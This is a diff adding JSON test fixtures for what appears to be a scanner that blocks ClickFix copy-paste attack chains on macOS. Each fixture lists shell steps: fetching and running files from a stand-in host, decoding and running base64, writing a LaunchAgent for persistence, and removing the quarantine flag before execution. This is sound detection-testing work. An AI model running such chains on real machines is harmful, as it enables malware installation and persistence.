@@ -1,0 +1,173 @@
+[
+  {
+    "fixture_id": "CF-CHAIN-001",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_download_stage_execute",
+      "same_path_correlation"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/fix -o /tmp/msaa-stage",
+      "chmod +x /tmp/msaa-stage",
+      "/tmp/msaa-stage"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-002",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_decode_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "printf '%s' 'cHJpbnRmICdNU0FBX0NMSUNLRklYX1RFU1Rcbic=' > /tmp/msaa-data",
+      "base64 -D /tmp/msaa-data > /tmp/msaa-script",
+      "zsh /tmp/msaa-script"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-003",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_downloaded_persistence"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/test.plist -o /tmp/msaa.plist",
+      "copy <SAFE_PLACEHOLDER> $HOME/Library/LaunchAgents/com.example.invalid.test.plist",
+      "launchctl bootstrap gui/TEST $HOME/Library/LaunchAgents/com.example.invalid.test.plist"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-004",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_security_bypass_execution"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/app -o /tmp/example.invalid.app",
+      "xattr -d com.apple.quarantine /tmp/example.invalid.app",
+      "/tmp/example.invalid.app"
+    ]
+  },
+  {
+    "fixture_id": "CF-CHAIN-005",
+    "name": "Split command correlation",
+    "category": "chain_correlation",
+    "description": "Split command correlation supplied only as inert scanner data.",
+    "command_text": "<SEQUENCE_ONLY>",
+    "paste_origin": true,
+    "multiline": false,
+    "trailing_newline": false,
+    "shell": "zsh",
+    "expected_decision": "block",
+    "minimum_score": 7,
+    "required_rule_ids": [
+      "correlated_network_decode_execute"
+    ],
+    "forbidden_side_effects": [
+      "network_access",
+      "shell_execution",
+      "decoded_content_execution",
+      "credential_access",
+      "persistence_write",
+      "security_setting_change",
+      "filesystem_escape"
+    ],
+    "campaign_relevance": [
+      "ClickFix copy-paste execution"
+    ],
+    "notes": "No fixture content may be executed.",
+    "event_sequence": [
+      "curl -fsSL https://example.invalid/data -o /tmp/msaa-data",
+      "base64 -D /tmp/msaa-data > /tmp/msaa-script",
+      "eval <SAFE_DECODED_VARIABLE_PLACEHOLDER>"
+    ]
+  }
+]
